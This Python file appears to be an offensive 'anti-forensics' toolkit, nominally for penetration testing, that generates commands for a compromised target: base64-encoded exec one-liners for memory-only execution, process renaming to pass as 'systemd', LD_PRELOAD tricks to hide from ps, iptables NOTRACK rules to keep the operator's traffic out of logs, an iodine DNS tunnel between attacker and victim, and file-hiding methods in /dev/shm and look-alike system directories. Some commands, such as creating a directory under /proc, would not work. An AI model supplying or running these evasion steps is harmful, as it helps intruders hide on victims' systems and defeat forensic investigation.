"""
Anti-Forensics Utilities
=========================

WARNING: FOR AUTHORIZED PENETRATION TESTING ONLY

Advanced utilities for avoiding forensic detection during penetration testing.
"""

import os
import sys
import tempfile
import subprocess
from typing import List, Optional


class MemoryOnlyMode:
    """
    Utilities for running operations entirely in memory (no disk writes).
    """

    @staticmethod
    def create_ram_disk(size_mb: int = 100) -> str:
        """
        Create a RAM disk for temporary operations.

        Args:
            size_mb: Size in megabytes

        Returns:
            Path to RAM disk
        """
        if sys.platform == "linux" or sys.platform == "linux2":
            # Linux: use tmpfs
            mount_point = "/tmp/ramdisk"
            commands = [
                f"mkdir -p {mount_point}",
                f"mount -t tmpfs -o size={size_mb}m tmpfs {mount_point}",
            ]
            script = " && ".join(commands)
            print(f"[*] Creating RAM disk...")
            print(f"[*] Run this on target (as root): {script}")
            return mount_point

        elif sys.platform == "win32":
            # Windows: use ImDisk (if installed)
            print(f"[*] Windows RAM disk requires ImDisk")
            print(f"[*] Download from: https://www.ltr-data.se/opencode.html/#ImDisk")
            return "R:\\"

        else:
            print(f"[!] Unsupported platform: {sys.platform}")
            return None

    @staticmethod
    def get_memory_only_python_command(script_content: str) -> str:
        """
        Generate a Python command that runs entirely in memory.

        Args:
            script_content: Python code to execute

        Returns:
            One-liner command
        """
        # Encode script to avoid shell escaping issues
        import base64

        encoded = base64.b64encode(script_content.encode()).decode()

        command = f"python3 -c \"import base64; exec(base64.b64decode('{encoded}'))\""
        print(f"[*] Memory-only Python command generated")
        print(f"[*] Run this on target: {command}")
        return command


class ProcessHiding:
    """
    Utilities for hiding processes from detection.
    """

    @staticmethod
    def rename_process(new_name: str = "systemd") -> str:
        """
        Rename the current process to blend in.

        Args:
            new_name: Process name to masquerade as
        """
        # Linux: modify /proc/self/comm
        command = f"echo '{new_name}' > /proc/self/comm"
        print(f"[*] Renaming process to: {new_name}")
        print(f"[*] Run this in your shell: {command}")
        return command

    @staticmethod
    def hide_from_ps() -> str:
        """
        Techniques to hide from 'ps' command.
        """
        tips = """
[*] Techniques to hide from 'ps':

1. Use a common name:
   - Rename your process to 'systemd', 'kworker', or '[kthreadd]'

2. Run from /tmp or /dev/shm (memory):
   - cd /dev/shm && ./your_tool

3. Use LD_PRELOAD to hook ps:
   - Create a library that filters your process from ps output

4. Run in a container:
   - docker run --rm -it alpine sh
"""
        print(tips)
        return tips


class NetworkStealth:
    """
    Utilities for hiding network activity.
    """

    @staticmethod
    def generate_iptables_rules(your_ip: str) -> str:
        """
        Generate iptables rules to hide your traffic from logs.

        Args:
            your_ip: Your IP address
        """
        script = f"""#!/bin/bash
# Hide traffic from {your_ip}

# Drop logging for your IP
iptables -I INPUT -s {your_ip} -j ACCEPT -m comment --comment "stealth"
iptables -I OUTPUT -d {your_ip} -j ACCEPT -m comment --comment "stealth"

# Disable connection tracking for your IP
iptables -t raw -I PREROUTING -s {your_ip} -j NOTRACK
iptables -t raw -I OUTPUT -d {your_ip} -j NOTRACK

echo "[+] Stealth rules applied"
"""
        print(f"[*] Generating iptables stealth rules...")
        return script

    @staticmethod
    def dns_tunneling_example() -> str:
        """
        Example of DNS tunneling for covert communication.
        """
        example = """
[*] DNS Tunneling Example:

# Server side (your machine):
sudo iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

# Client side (compromised target):
sudo iodine -f -P password tunnel.yourdomain.com

# Now you have a tunnel over DNS!
# Use it: ssh -o ProxyCommand="nc -X connect -x 10.0.0.1:1080 %h %p" user@target
"""
        print(example)
        return example


class FileHiding:
    """
    Utilities for hiding files and directories.
    """

    @staticmethod
    def hide_file_linux(file_path: str) -> List[str]:
        """
        Hide a file on Linux systems.

        Args:
            file_path: File to hide

        Returns:
            List of commands
        """
        commands = [
            # Method 1: Dot prefix (simple)
            f"mv {file_path} .{os.path.basename(file_path)}",
            # Method 2: Hide in /dev/shm (memory)
            f"cp {file_path} /dev/shm/.{os.path.basename(file_path)}",
            # Method 3: Set immutable attribute
            f"chattr +i {file_path}",
            # Method 4: Hide in /proc (advanced)
            f"mkdir /proc/.hidden && cp {file_path} /proc/.hidden/",
        ]

        print(f"[*] File hiding techniques:")
        for i, cmd in enumerate(commands, 1):
            print(f"  {i}. {cmd}")

        return commands

    @staticmethod
    def create_hidden_directory() -> str:
        """
        Create a hidden directory in a clever location.
        """
        locations = [
            "/dev/shm/.cache",  # Memory-based
            "/tmp/....",  # Looks like a typo
            "/var/tmp/.X11-unix",  # Mimics system dir
            "$HOME/.config/systemd/.user",  # Looks legitimate
        ]

        print(f"[*] Suggested hidden directory locations:")
        for loc in locations:
            print(f"  - {loc}")

        return locations[0]


# Example usage
if __name__ == "__main__":
    print("=" * 70)
    print("ANTI-FORENSICS UTILITIES")
    print("=" * 70)
    print()

    print("[1] Memory-Only Mode")
    print("[2] Process Hiding")
    print("[3] Network Stealth")
    print("[4] File Hiding")
    print()

    choice = input("Select option (1-4): ")

    if choice == "1":
        MemoryOnlyMode.create_ram_disk(100)
    elif choice == "2":
        ProcessHiding.hide_from_ps()
    elif choice == "3":
        your_ip = input("Enter your IP: ")
        NetworkStealth.generate_iptables_rules(your_ip)
    elif choice == "4":
        FileHiding.create_hidden_directory()
